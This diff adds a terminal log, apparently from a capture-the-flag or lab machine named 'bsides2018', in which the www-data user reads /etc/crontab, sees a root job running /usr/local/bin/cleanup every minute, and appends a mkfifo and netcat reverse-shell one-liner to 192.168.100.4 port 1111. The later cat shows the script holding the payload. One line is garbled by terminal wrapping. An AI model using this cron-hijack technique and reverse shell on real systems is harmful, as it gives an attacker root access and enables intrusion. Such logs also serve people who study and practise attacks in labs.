@@ -1,0 +1,24 @@
+www-data@bsides2018:/$ cat /etc/crontab                                                                                                        
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *    * * *   root    /usr/local/bin/cleanup
+
+www-data@bsides2018:/$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.100.4 1111 >/tmp/f' >> /usr/local/bin/cleanup
+2.168.100.4 1111 >/tmp/f' >> /usr/local/bin/cleanup|nc 19 
+www-data@bsides2018:/$ cat /usr/local/bin/cleanup
+cat /usr/local/bin/cleanup
+#!/bin/sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.100.4 1111 >/tmp/f
